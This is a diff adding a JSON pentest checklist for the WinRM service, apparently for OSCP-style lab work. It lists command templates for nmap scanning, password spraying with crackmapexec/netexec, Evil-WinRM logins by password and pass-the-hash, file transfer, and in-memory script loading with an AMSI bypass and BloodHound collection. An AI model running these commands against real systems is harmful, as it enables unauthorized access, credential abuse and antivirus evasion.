@@ -1,0 +1,83 @@
+{
+  "service": "WinRM",
+  "port": 5985,
+  "categories": [
+    {
+      "category": "1. Recon & Spraying",
+      "tasks": [
+        {
+          "id": "winrm_nmap",
+          "title": "Nmap WinRM Scan",
+          "description": "Verify WinRM ports (5985 HTTP / 5986 HTTPS) and check supported authentication methods.",
+          "commands": [
+            "nmap -p 5985,5986 -sV --script winrm-discover {target_ip}"
+          ]
+        },
+        {
+          "id": "winrm_password_spray",
+          "title": "Password Spraying (CME / NetExec)",
+          "description": "Spray known user lists and custom wordlists against the WinRM service.",
+          "commands": [
+            "crackmapexec winrm {target_ip} -u users.txt -p '/home/kali/Desktop/OSCP/Tools/Password cracking/jonspass.txt' --continue-on-success",
+            "netexec winrm {target_ip} -u <user> -p '<password>' --local-auth"
+          ]
+        }
+      ]
+    },
+    {
+      "category": "2. Authentication & Execution",
+      "tasks": [
+        {
+          "id": "winrm_evil_password",
+          "title": "Evil-WinRM (Password)",
+          "description": "Gain an interactive PowerShell session using known plaintext credentials.",
+          "commands": [
+            "evil-winrm -i {target_ip} -u <username> -p '<password>'"
+          ]
+        },
+        {
+          "id": "winrm_evil_pth",
+          "title": "Evil-WinRM (Pass-The-Hash)",
+          "description": "Gain an interactive PowerShell session using an NTLM hash. Bypasses the need to crack the hash.",
+          "commands": [
+            "evil-winrm -i {target_ip} -u <username> -H <NTLM_Hash>"
+          ]
+        },
+        {
+          "id": "winrm_native_ps",
+          "title": "Native PowerShell (Enter-PSSession)",
+          "description": "Connect natively from a Windows attack box or an already compromised Windows host.",
+          "commands": [
+            "$password = ConvertTo-SecureString \"<password>\" -AsPlainText -Force",
+            "$cred = New-Object System.Management.Automation.PSCredential(\"<username>\", $password)",
+            "Enter-PSSession -ComputerName {target_ip} -Credential $cred"
+          ]
+        }
+      ]
+    },
+    {
+      "category": "3. Post-Exploitation & File Transfer",
+      "tasks": [
+        {
+          "id": "winrm_evil_transfer",
+          "title": "Evil-WinRM File Transfers",
+          "description": "Once inside an Evil-WinRM session, use the built-in commands to easily upload and download files.",
+          "commands": [
+            "upload <local_filename> <remote_destination>",
+            "download <remote_filename> <local_destination>"
+          ]
+        },
+        {
+          "id": "winrm_evil_memory",
+          "title": "Evil-WinRM Load Scripts in Memory",
+          "description": "Bypass disk-based AV by loading PowerShell scripts (like PowerView or WinPEAS) directly into memory.",
+          "commands": [
+            "evil-winrm -i {target_ip} -u <username> -p '<password>' -s /opt/privesc/scripts",
+            "Bypass-4MSI",
+            "Invoke-Bloodhound -CollectionMethod All"
+          ]
+        }
+      ]
+    }
+  ]
+}
